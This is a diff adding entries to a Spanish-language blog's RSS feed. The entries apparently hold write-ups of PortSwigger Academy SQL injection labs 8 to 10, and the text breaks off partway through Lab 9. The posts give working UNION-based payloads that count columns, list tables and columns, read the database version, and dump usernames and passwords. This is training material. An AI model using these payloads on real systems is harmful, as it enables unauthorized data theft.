@@ -6,7 +6,295 @@
         <description>Recent content on A1ux</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-GT</language>
-        <lastBuildDate>Thu, 04 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 07 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 10</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</link>
+        <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 10" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-oracle&#34;&gt;Lab: SQL injection attack, listing the database contents on Oracle&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos en una base de datos oracle que es muy distinto a como se hace en los otros gestores&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
+&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
+&lt;p&gt;Ahora recuperar las tablas, en este caso vamos a buscar una tabla que contenga los usuarios, en este caso es la tabla &lt;code&gt;USERS_TMNLZU&lt;/code&gt; y es la que se lista.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select table_name,null from all_tables-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 117; 
+			flex-basis: 280px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34; data-size=&#34;1720x1470&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34;
+			width=&#34;1720&#34;
+			height=&#34;1470&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Tablas&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Tablas&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h3&gt;
+&lt;p&gt;Para detectar el nombre de las columnas en las tablas se inyecta la siguiente consulta, indicando la tabla de la que se quiere extraer.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select column_name,null from all_tab_columns where table_name = &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;USERS_TMNLZU&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 104; 
+			flex-basis: 250px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
+			width=&#34;1766&#34;
+			height=&#34;1692&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Columnas de tabla USERS_TMNLZU&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Columnas de tabla USERS_TMNLZU&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h3&gt;
+&lt;p&gt;Ahora podremos recuperar los datos teniendo el nombre de las columnas y el nombre de las tablas.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select USERNAME_KNMULR,PASSWORD_KQXSZA from USERS_TMNLZU-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 104; 
+			flex-basis: 250px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
+			width=&#34;1766&#34;
+			height=&#34;1692&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Datos extraidos de la tabla USERS_TMNLZU&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Datos extraidos de la tabla USERS_TMNLZU&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 202; 
+			flex-basis: 485px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34; data-size=&#34;1797x888&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34;
+			width=&#34;1797&#34;
+			height=&#34;888&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 8</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</link>
+        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 8" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de la base de datos MySQL o Microsoft SQL Server y poder imprimir en las tablas que se presentan. La string que deberiamos de recuperar es &lt;code&gt;8.0.27&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
+&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
+&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select @@version,null-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 92; 
+			flex-basis: 221px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34; data-size=&#34;1763x1908&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34;
+			width=&#34;1763&#34;
+			height=&#34;1908&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 9</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</link>
+        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 9" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases&#34;&gt;Lab: SQL injection attack, listing the database contents on non-Oracle databases&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer datos de la base de datos, basandose en inyectar consultas para tomarlos, al final se resuelve el laboratorio iniciando sesion con el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
+&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,table_name fRoM information_schema.tables-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 93; 
+			flex-basis: 225px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34; data-size=&#34;1794x1909&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34;
+			width=&#34;1794&#34;
+			height=&#34;1909&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Listado de Tablas&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Listado de Tablas&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;recuperar-nombres-de-columnas-de-la-tabla-users_fcqnpf&#34;&gt;Recuperar nombres de columnas de la tabla &lt;code&gt;users_fcqnpf&lt;/code&gt;&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,column_name fRoM information_schema.columns wHeRe table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users_fcqnpf&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 105; 
+			flex-basis: 254px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34; data-size=&#34;1754x1657&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34;
+			width=&#34;1754&#34;
+			height=&#34;1657&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Listado de columnas de la tabla users_fcqnpf&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Listado de columnas de la tabla users_fcqnpf&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;recuperar-datos&#34;&gt;Recuperar Datos&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username_nrukiy,password_ebqikr from users_fcqnpf-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 185; 
+			flex-basis: 444px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34; data-size=&#34;1749x944&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34;
+			width=&#34;1749&#34;
+			height=&#34;944&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Usuarios y Contrasenas extraidos&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Usuarios y Contrasenas extraidos&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 247; 
+			flex-basis: 594px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34; data-size=&#34;1783x720&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34;
+			width=&#34;1783&#34;
+			height=&#34;720&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
